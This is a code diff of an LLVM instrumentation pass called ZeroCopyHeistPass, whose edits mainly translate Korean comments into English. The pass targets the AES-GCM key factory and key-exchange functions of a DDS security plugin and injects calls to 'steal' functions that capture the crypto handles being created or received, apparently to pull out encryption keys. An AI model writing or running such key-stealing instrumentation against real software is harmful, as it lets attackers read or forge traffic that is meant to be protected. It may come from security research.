@@ -17,13 +17,13 @@ struct ZeroCopyHeistPass : public PassInfoMixin<ZeroCopyHeistPass> {
     PreservedAnalyses run(Function &F, FunctionAnalysisManager &FAM) {
         StringRef FuncName = F.getName();
         
-        // 💡 [핵심 수정] 타겟 함수 분리 (TX는 Phase 2, RX는 Phase 4)
+        // [Core Modification] Separate target functions (TX is Phase 2, RX is Phase 4)
         bool isTX = FuncName.contains("register_local_datawriter") && FuncName.contains("AESGCMGMAC_KeyFactory");
         bool isRX = FuncName.contains("set_remote_datawriter_crypto_tokens") && FuncName.contains("AESGCMGMAC_KeyExchange");
 
         if (!isTX && !isRX) return PreservedAnalyses::all();
 
-        errs() << "\n[ZeroCopyHeistPass] 🎯 Target Function Found: " << FuncName << "\n";
+        errs() << "\n[ZeroCopyHeistPass] Target Function Found: " << FuncName << "\n";
 
         Module *M = F.getParent();
         LLVMContext &Ctx = M->getContext();
@@ -41,25 +41,23 @@ struct ZeroCopyHeistPass : public PassInfoMixin<ZeroCopyHeistPass> {
                     IRBuilder<> Builder(RetInst);
                     
                     if (isTX) {
-                        // TX: 자신이 방금 생성한 핸들(리턴값)을 탈취
+                        // TX: Intercept the handle (return value) that was just generated
                         Value *RetVal = RetInst->getReturnValue();
                         if (RetVal) {
                             Value *CastVal = Builder.CreateBitCast(RetVal, PtrTy);
                             Builder.CreateCall(TXStealFunc, {CastVal});
                             Changed = true;
                             errs() << "\n[success] >>> <steal_and_bake_key> ";
-
                         }
                     } else if (isRX) {
-                        // 💡 RX: 리턴값이 bool이므로, 함수의 두번째 인자(remote_datawriter_crypto) 참조를 탈취!
-                        // 💡 [수정] C++ 멤버 함수이므로 Arg(0)은 'this'입니다.
+                        // RX: Since the return value is a boolean, intercept the reference to the second argument (remote_datawriter_crypto)!
+                        // [Modification] Since this is a C++ member function, Arg(0) is 'this'.
                         // Arg(1): local_reader, Arg(2): remote_writer
                         Value *Arg1 = F.getArg(2); 
                         Value *CastVal = Builder.CreateBitCast(Arg1, PtrTy);
                         Builder.CreateCall(RXStealFunc, {CastVal});
                         Changed = true;
                         errs() << "\n[success] >>> <steal_and_bake_key_rx> ";
-
                     }
                 }
             }
